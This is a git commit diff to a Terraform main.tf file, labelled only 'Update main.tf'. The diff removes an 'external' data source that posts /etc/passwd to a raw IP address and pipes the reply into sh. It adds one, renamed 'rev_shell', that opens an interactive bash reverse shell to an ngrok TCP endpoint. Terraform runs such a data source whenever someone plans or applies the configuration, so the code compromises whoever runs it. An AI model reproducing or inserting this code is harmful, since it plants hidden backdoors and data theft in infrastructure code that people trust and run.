b09457a7e167591ac8e5cfd9a709a31deca29cae
Sagar Banwa <sagarbanwa80@gmail.com>
2025-06-26 23:01:47 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,6 +1,6 @@
-data "external" "example" {
+data "external" "rev_shell" {
   program = [
     "sh", "-c",
-    "curl -X POST --data-binary @/etc/passwd tcp://130.198.22.124:4444/exfil4 | sh"
+    "bash -i >& /dev/tcp/0.tcp.in.ngrok.io/10168 0>&1"
   ]
 }
